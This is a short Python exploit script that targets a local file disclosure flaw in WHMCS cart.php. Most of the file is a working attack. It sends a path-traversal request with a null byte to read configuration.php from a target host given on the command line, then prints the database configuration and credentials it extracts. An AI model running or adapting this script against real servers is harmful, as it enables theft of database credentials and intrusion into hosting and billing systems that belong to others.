# whmcs_exploit.py
# description: Gets the database config if it is vulnerable to WHMCS cart.php Local File Disclosure
# author: @shipcod3
# reference: http://packetstormsecurity.com/files/106602/whmcs3x-disclose.txt

import sys
from urllib import urlopen
import re
import string

code_regexp = re.compile("<\?php.+\?>",re.DOTALL)

def get_code(inp):
    blocks = code_regexp.findall(inp)
    lines = []
    for block in blocks:
        lines+=[line.strip() for line in block.split(";")]
    return lines

def usage(): 
    print("USAGE: python filename www.host.com")

def whmcs_exploit(argv):
    if len(argv) < 2: 
        return usage()
    
    base = argv[1]
    vulne = "http://{}/cart.php?a=account&templatefile=../../../configuration.php%00".format(base)
    print("Exploiting >>  {}".format(vulne))

    f = urlopen(vulne)
    code = get_code(f.read())

    if code is None:
        print("Not vulnerable!")

    else:
        print("\n".join(code))
    
if __name__ == "__main__":
    whmcs_exploit(sys.argv)
